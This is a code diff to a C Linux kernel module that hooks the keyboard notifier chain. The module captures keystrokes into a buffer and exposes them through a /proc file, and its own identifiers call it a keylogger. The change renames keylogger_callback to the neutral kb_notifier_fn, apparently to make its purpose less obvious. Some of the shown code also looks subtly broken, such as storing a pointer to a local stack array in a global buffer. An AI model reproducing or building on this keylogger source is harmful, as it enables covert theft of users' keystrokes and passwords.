@@ -62,7 +62,6 @@ void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_
         const char *us_key = (shift_mask == 1)
             ? us_keymap[keycode][1]
             : us_keymap[keycode][0];
-        //snprintf(buf, buf_size, "%s", us_key);
     }
 }
 
@@ -138,7 +137,7 @@ void analyze_buffer(void)
     printk(KERN_INFO "DEBUG: analyze_buffer() - END");
 }
 
-int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param)
+int kb_notifier_fn(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
     char keybuf[12] = {0};
@@ -149,12 +148,12 @@ int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *
 
     if (strlen(keybuf) < 1) return NOTIFY_OK;
 
-    printk(KERN_INFO "DEBUG: keylogger_callback() - keybuf = %s", keybuf);
+    printk(KERN_INFO "DEBUG: kb_notifier_fn() - keybuf = %s", keybuf);
     buffer[buffer_index] = keybuf;
-    printk(KERN_INFO "DEBUG: keylogger_callback() - buffer[%d] = %s", buffer_index, buffer[buffer_index]);
+    printk(KERN_INFO "DEBUG: kb_notifier_fn() - buffer[%d] = %s", buffer_index, buffer[buffer_index]);
     buffer_index++;
     if (buffer_index >= BUFFER_SIZE) {
-        printk(KERN_INFO "DEBUG: keylogger_callback() - Buffer full, analyzing...");
+        printk(KERN_INFO "DEBUG: kb_notifier_fn() - Buffer full, analyzing...");
         analyze_buffer();
     }
 
@@ -174,7 +173,7 @@ ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp)
 }
 
 static struct notifier_block keylogger_nb = {
-    notifier_call: keylogger_callback,
+    notifier_call: kb_notifier_fn,
 };
 
 static struct proc_ops keylogger_proc_ops = {
